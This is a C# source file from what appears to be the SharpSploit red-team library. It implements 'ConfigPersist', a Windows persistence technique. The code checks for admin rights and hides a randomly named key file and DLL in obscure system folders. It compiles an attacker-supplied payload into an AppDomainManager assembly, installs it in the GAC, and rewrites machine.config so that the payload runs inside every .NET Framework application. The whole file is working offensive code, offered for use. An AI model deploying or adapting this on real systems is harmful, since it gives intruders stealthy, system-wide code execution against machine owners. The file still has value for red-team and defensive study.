// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.CodeDom.Compiler;
using System.Xml;
using System.EnterpriseServices.Internal;
using System.Collections.Generic;
using System.IO;
using System.Security.Principal;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Linq;

namespace SharpSploit.Persistence
{


    /// <summary>
    /// Class represents a Tuple since tuples do not exist until .NET Framework 4 😡
    /// https://stackoverflow.com/questions/4312218/error-with-tuple-in-c-sharp-2008
    /// </summary>
    /// <typeparam name="T">Item 1</typeparam>
    /// <typeparam name="U">Item 2 </typeparam>
    /// <typeparam name="V">Item 3</typeparam>
    public class MyTuple<T, U, V>
    {
        public T Item1 { get; private set; }
        public U Item2 { get; private set; }
        public V Item3 { get; private set; }

        public MyTuple(T item1, U item2, V item3)
        {
            Item1 = item1;
            Item2 = item2;
            Item3 = item3;
        }
     
    }

    /// <summary>
    /// Static class of Tuple 
    /// https://stackoverflow.com/questions/4312218/error-with-tuple-in-c-sharp-2008
    /// </summary>
    public static class MyTuple
    {
        public static MyTuple<T, U, V> Create<T, U, V>(T item1, U item2, V item3)
        {
            return new MyTuple<T, U, V>(item1, item2, item3);
        }
    }

    
    /// <summary>
    /// ConfigPersist is a class that performs CLR hooking via modifying machine.config. Requires elevation.
    /// </summary>
    public class ConfigPersist
    {

        private static string CharObfuscation(string str)
        {
            string randomString = "";
            Random rnd = new Random();
            foreach (var letter in str)
            {
                int rand_num = rnd.Next(1, 3);
                randomString += rand_num == 1 ? char.ToLower(letter) : char.ToUpper(letter);
            }
            return randomString;
        }

        private static string Createstr()
        {
            var firstValid = Enumerable.Range(65, 26).ToList().Concat(Enumerable.Range(97, 26).ToList());
            var fiveRandom = firstValid.AsEnumerable().OrderBy(num => Guid.NewGuid()).Take(5);
            string name = "";
            fiveRandom.ToList().ForEach(num => name += (char)num);
            return name;
        }

        private static bool IsAdminorSystem()
        {
            bool isSystem;
            using (var identity = WindowsIdentity.GetCurrent())
            {
                isSystem = identity.IsSystem;
            }

            return isSystem || WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
        }

        /// <summary>
        /// Determines if a directory is writable.
        /// </summary>
        /// <param name="dirPath">Directory path.</param>
        /// <param name="throwIfFails">Bool so if fails throw an error.</param>
        /// <returns>bool that indicates if directory is writable.</returns>
        private static bool IsDirectoryWritable(string dirPath, bool throwIfFails = false)
        {
            // https://stackoverflow.com/questions/1410127/c-sharp-test-if-user-has-write-access-to-a-folder
            // Sanity check to see if we can place our compiled dll in our special path
            try
            {
                using (FileStream fs = File.Create(
                    Path.Combine(
                        dirPath,
                        Path.GetRandomFileName()),
                    1,
                    FileOptions.DeleteOnClose))
                {
                }

                return true;
            }
            catch
            {
                if (throwIfFails)
                {
                    throw;
                }
                else
                {
                    return false;
                }
            }
        }

        /// <summary>
        /// Determines where to place compiled assembly and keyfile given list of paths.
        /// </summary>
        /// <returns>Randomly selected path from path list.</returns>
        private static string GetPath()
        {
            var winPath = "C:\\WINDOWS";
            var sys32 = $"{winPath}\\System32";

            // Thank you to matterpreter for this list :)
            List<string> paths = new List<string>
            {
                $"{sys32}\\microsoft\\crypto\rsa\\machinekeys",
                $"{winPath}\\syswow64\\tasks\\microsft\\windows\\pla\\system",
                $"{winPath}\\debug\\wia",
                $"{sys32}\\tasks",
                $"{winPath}\\syswow64\\tasks",
                $"{winPath}\\registration\\crmlog",
                $"{sys32}\\com\\dmp",
                $"{sys32}\\fxstmp",
                $"{sys32}\\spool\\drivers\\color",
                $"{sys32}\\spool\\printers",
                $"{sys32}\\spool\\servers",
                $"{winPath}\\syswow64\\com\\dmp",
                $"{winPath}\\syswow64\\fxstmp",
                $"{winPath}\\temp",
                $"{winPath}\\tracing",
            };
            paths = paths.FindAll(path => Directory.Exists(path) && IsDirectoryWritable(path));
           
            if (paths.Count == 0)
            {
                // Sanity check
                // If for some reason every path fails we will just use our current directory
                paths.Add(Environment.CurrentDirectory);
            }

            var random = new Random();

            // return random path where we will place our strong signed assembly
            return paths[random.Next(paths.Count)];
        }

        /// <summary>
        /// Loads our strong signed .net assembly into the GAC.
        /// </summary>
        /// <param name="path">Path to .net assembly.</param>
        private static bool InstallAssembly(string path)
        {
            try
            {
                var publisher = new Publish();
                publisher.GacInstall(path);
            }
            catch (Exception e)
            {
                Console.WriteLine($"An exception occurred while attempting to install .net assembly into GAC {e}");
                return false;
            }

            return true;
        }

        /// <summary>
        /// Generates keyfile and places it in location from GetPath()
        /// </summary>
        /// <param name="fileName"></param>
        /// <returns></returns>
        private static string GenerateKeyFile(string fileName)
        {
            var path = fileName.Length == 0 ? $"{GetPath()}\\{CharObfuscation(Createstr())}.snk" : $"{GetPath()}\\{fileName}.snk";
            //var path = $"{Environment.CurrentDirectory}\\key.snk";
            try
            {
                StrongNameUtilities.GenerateKeyFile(path);
            }
            catch(Exception e)
            {
                Console.WriteLine($"Unable to generate keyfile: {e}");
            }
            return path;
        }

        /// <summary>
        /// Compiles our strong signed assembly based on code in string and places dll in dllPath.
        /// </summary>
        /// <param name="dllName">Name of dll supplied by user, if one is not given will use randomly generated one</param>
        /// <param name="dllPath">Path where assembly will be placed</param>
        /// <param name="payload">C# code that will be ran whenver .net framework app is ran</param>
        /// <param name="keyPath">Path to keyfile</param>
        /// <returns>Tuple containing path, assembly full name, and conext of assembly</returns>
        private static MyTuple<string, string, string> CompileDLL(string dllName, string dllPath, string payload, string keyPath)
        {
            // Feel free to change the name ConfigHooking or namespace
            // Of course feel free to do more than just start calc :)
            
            var firstPart = @"using System;
                 namespace Context {
                    public sealed class ConfigHooking : AppDomainManager {
                        public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {";

            var secondpart = @"return;}}}";
            var malCSharp = firstPart + payload + secondpart;
       
            CodeDomProvider objCodeCompiler = CodeDomProvider.CreateProvider("CSharp");
            var name = dllName.Length == 0 ? CharObfuscation(Createstr()) : dllName;

            // Generate name for strong signed .net assembly, will be name in GAC
           
            CompilerParameters cp = new CompilerParameters();

            // ADD reference assemblies here
            cp.ReferencedAssemblies.Add("System.dll");
            cp.TreatWarningsAsErrors = false;
            dllPath = $"{dllPath}\\{name}.dll";
            cp.OutputAssembly = dllPath;
            cp.GenerateInMemory = false;
            cp.CompilerOptions = "/optimize";

            cp.CompilerOptions = $"/keyfile:{keyPath}";
            cp.IncludeDebugInformation = false;
            CompilerResults cr = objCodeCompiler.CompileAssemblyFromSource(cp, malCSharp);
            var types = cr.CompiledAssembly.GetExportedTypes();
            string context;
            try
            {
                context = types[0].ToString();
                Console.WriteLine($"inside try context is: {context}");
            }
            catch (Exception)
            {
                Console.WriteLine("types does not have length greater than 0");
                context = "null";
            }

            string asmFullName;
            try
            {
                asmFullName = cr.CompiledAssembly.FullName;
            }
            catch (Exception e)
            {
                Console.WriteLine("An exception occurred while trying to get fullname, most likely due to missing keyfile!");
                Console.WriteLine(e);
                asmFullName = $"{name}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null";
            }

            if (cr.Errors.Count > 0)
            {
                Console.WriteLine("Build errors occurred");
                foreach (CompilerError ce in cr.Errors)
                {
                    Console.WriteLine(ce);
                }
                return MyTuple.Create(string.Empty, string.Empty, string.Empty);
            }
            else
            {
                return MyTuple.Create(dllPath, asmFullName, context);
            }
        }

        /// <summary>
        /// This is where the magic happens
        /// This is the core function that modifies the machine config
        /// It will modify it so at runtime our strong signed .net assembly will be called.
        /// </summary>
        /// <param name="configpath">Path to machine.config.</param>
        /// <param name="assemblyFullName">Full Name for Assembly.</param>
        /// <param name="context"></param>
        private static bool FixConfig(string configpath, string assemblyFullName, string context)
        {
            try
            {
                Console.WriteLine($"inside fixConfig and assemblyFullName: {assemblyFullName}");
                XmlDocument doc = new XmlDocument();
                doc.Load(configpath);
                XmlNode node = doc.SelectSingleNode("/configuration/runtime");
                XmlElement ele = doc.CreateElement("appDomainManagerType");
                ele.SetAttribute("value", context ?? "Context.ConfigHooking");
                node.AppendChild(ele.Clone());
                XmlElement secondEle = doc.CreateElement("appDomainManagerAssembly");
                secondEle.SetAttribute("value", assemblyFullName);
                node.AppendChild(secondEle.Clone());
                doc.Save(configpath);
            }
            catch (Exception e)
            {
                Console.WriteLine($"An exception has occurred while attempting to 'fix' config: {e}");
                return false;
            }

            return true;
        }

        /// <summary>
        /// Generates a keyfile, creates assembly, signs assembly, and modifies machine.config runtime element to perform clr hooking
        /// </summary>
        /// <author>NotoriousRebel</author>
        /// <returns>A boolean, if true execute was successful false otherwise</returns>
        /// <param name="payload">C# code that will be executed during runtime of any .net framework app</param>
        /// <param name="dllName">Optional name for assembly to be installed onto GAC</param>
        /// <param name="keyfileName">Optional paramater for keyfile name</param>
        public bool InstallConfigPersist(string payload, string dllName="",  string keyfileName="")
        {
            try
            {
                if (!IsAdminorSystem())
                {
                    Console.WriteLine("Must be administrator for technique to work, exiting program!");
                    return false;
                }

                var dirPath = GetPath();
                Console.WriteLine($"path is: {dirPath}");
                var keyPath = GenerateKeyFile(keyfileName);
                Console.WriteLine($"keyPath: {keyPath}");
                var tuple = CompileDLL(dllName, dirPath, payload, keyPath);
                string dllPath = tuple.Item1;
                string asmFullName = tuple.Item2;
                string context = tuple.Item3;
                Console.WriteLine($"dllPath is {dllPath}");
                Console.WriteLine($"asmFullName is: {asmFullName}");
                Console.WriteLine($"context is: {context}");
                bool loaded = InstallAssembly(dllPath);
                if (loaded == false)
                {
                    throw new Exception("Unable to install assembly into GAC");
                }

                Console.WriteLine($"Successfully added assembly to CLR: {asmFullName}");

                var sysConfigFile = System.Runtime.InteropServices.RuntimeEnvironment.SystemConfigurationFile;
                Console.WriteLine($"sysConfigFile: {sysConfigFile}");

                var paths = new List<string>()
                {
                     sysConfigFile,
                     sysConfigFile.Contains("Framework64") ? sysConfigFile.Replace("Framework64", "Framework") : sysConfigFile.Replace("Framework", "Framework64"),
                };

                // Hours wasted debugging this because it returns 32 bit version of .NET Framework
                foreach (var configPath in paths)
                {
                    Console.WriteLine($" ConfigPath: {configPath}");
                    FixConfig(configPath, asmFullName, context);
                }
                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine($"An error has occurred: {e}");
                return false;
            }
        }
    }

    /// <summary>
    /// Class to generate strong key https://stackoverflow.com/questions/50632961/c-sharp-create-snk-file-programmatically
    /// Required to sign our assembly so we can install it onto the Global Assembly Cache to gain full-trust
    /// </summary>
    public sealed class StrongNameUtilities
    {
        public static void GenerateKeyFile(string snkFile, int keySizeInBits = 4096)
        {
            if (snkFile == null)
                throw new ArgumentNullException(nameof(snkFile));

            var bytes = GenerateKey(keySizeInBits);
            File.WriteAllBytes(snkFile, bytes);
        }

        public static byte[] GenerateKey(int keySizeInBits = 4096)
        {
            if (!StrongNameKeyGenEx(null, 0, keySizeInBits, out var blob, out var size))
                throw new Win32Exception(StrongNameErrorInfo());

            try
            {
                var bytes = new byte[size];
                Marshal.Copy(blob, bytes, 0, size);
                return bytes;
            }
            finally
            {
                if (blob != IntPtr.Zero)
                {
                    StrongNameFreeBuffer(blob);
                }
            }
        }

        [DllImport("mscoree")]
        private extern static void StrongNameFreeBuffer(IntPtr pbMemory);

        [DllImport("mscoree", CharSet = CharSet.Unicode)]
        private static extern bool StrongNameGetPublicKey(
            string szKeyContainer,
            [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 2)] byte[] pbKeyBlob,
            int cbKeyBlob,
            out IntPtr ppbPublicKeyBlob,
            out int pcbPublicKeyBlob);

        [DllImport("mscoree", CharSet = CharSet.Unicode)]
        private static extern bool StrongNameKeyGenEx(string wszKeyContainer, int dwFlags, int dwKeySize, out IntPtr ppbKeyBlob, out int pcbKeyBlob);

        [DllImport("mscoree")]
        private static extern int StrongNameErrorInfo();
    }
}
